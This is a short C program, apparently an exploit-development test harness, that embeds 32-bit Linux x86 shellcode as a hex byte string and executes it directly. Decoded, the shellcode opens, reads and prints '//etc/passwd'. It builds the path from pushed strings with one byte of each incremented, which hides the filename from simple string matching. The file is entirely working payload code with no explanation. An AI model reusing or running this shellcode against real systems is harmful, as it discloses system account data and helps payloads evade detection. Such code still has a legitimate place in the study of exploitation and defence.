#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc9\x89\xc8\x50\xb0\x05\x68\x72\x73\x77\x64\x83\x04\x24\x01\x68\x62\x2f\x70\x61\x83\x04\x24\x01\x68\x2e\x2f\x65\x74\x83\x04\x24\x01\x89\xe3\xcd\x80\x93\x91\xb0\x03\x31\xd2\x66\xba\xff\x0f\x83\xc2\x01\xcd\x80\x92\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
